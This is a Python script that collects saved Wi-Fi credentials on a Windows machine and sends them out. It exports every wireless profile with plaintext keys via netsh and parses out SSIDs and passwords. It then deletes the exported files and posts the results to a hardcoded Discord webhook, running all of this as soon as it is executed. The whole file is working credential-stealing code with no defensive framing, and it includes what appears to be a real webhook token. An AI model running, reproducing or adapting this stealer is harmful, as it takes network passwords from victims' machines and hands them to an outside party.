import os
import subprocess
from discord_webhook import DiscordWebhook, DiscordEmbed

def send_wifi_passwords_to_discord(webhook_url):
    with open("passwords.txt", "w") as f:
        f.write("Available Wi-Fi credentials on the machine:\n")
        f.close()
    command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True, text=True).stdout
    path = os.getcwd()
    wifi_files = []
    for filename in os.listdir(path):
        if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
            wifi_files.append(filename)
    for i in wifi_files:
        with open(i, "r") as f:
            name_counter = 0
            wifi_name = ""
            wifi_password = ""
            creds = []
            for line in f.readlines():
                if "name" in line and name_counter == 0:
                    name_counter += 1
                    stripped = line.strip()
                    front = stripped[6:]
                    back = front[:-7]
                    wifi_name = back
                if "keyMaterial" in line:
                    stripped = line.strip()
                    front = stripped[13:]
                    back = front[:-14]
                    wifi_password = back
        if wifi_password == "":
            wifi_password = "none"
        creds = [wifi_name, wifi_password]
        with open("passwords.txt", "a") as f:
            f.write("\n[*] SSID: " + creds[0] + "\n" + "[!] Password: " + creds[1] + "\n")
            f.close()
    for i in wifi_files:
        os.remove(i)
    with open("passwords.txt", "r") as f:
        password_message = f.read()
    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title="Wi-Fi Passwords", description=password_message, color=0x3498DB)
    webhook.add_embed(embed)
    webhook.execute()


wifi_passwords_webhook_url = "https://discord.com/api/webhooks/1214868844070572072/MU0SiSRJyDTWd41MmeU67-T2A7dFihCORmgbNfhLTWj-4mUl5jPDw1qZVdz6OORO_3yv"
send_wifi_passwords_to_discord(wifi_passwords_webhook_url)
